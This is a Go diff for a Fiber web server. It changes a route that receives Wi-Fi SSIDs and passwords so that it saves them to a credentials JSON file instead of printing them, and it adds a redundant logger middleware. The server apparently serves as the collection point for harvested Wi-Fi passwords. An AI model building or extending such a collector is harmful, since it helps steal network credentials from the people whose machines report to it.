@@ -1,7 +1,7 @@
 package server
 
 import (
-	"fmt"
+	"encoding/json"
 	"os"
 
 	"github.com/gofiber/fiber/v2"
@@ -29,15 +29,21 @@ func routes() {
 			return Ctx.Status(fiber.StatusBadRequest).SendString(err.Error())
 		}
 
-		for _, wifi := range wifi {
-			fmt.Printf("Received WIFI SSID: %s, Password: %s\n", wifi.SSID, wifi.Password)
+		var filePath string = "server/credentials/creds.json"
+		file, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
+		if err != nil {
+			return Ctx.Status(fiber.StatusInternalServerError).SendString(err.Error())
 		}
+		var encoder *json.Encoder = json.NewEncoder(file)
+
+		encoder.Encode(wifi)
 
 		return Ctx.SendStatus(200)
 	})
 }
 
 func log() {
+	app.Use(logger.New())
 	file, _ := os.OpenFile("logs/server.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	app.Use(logger.New(logger.Config{
 		Format: "[${ip}]:${port} ${status} - ${method} ${path}\n",
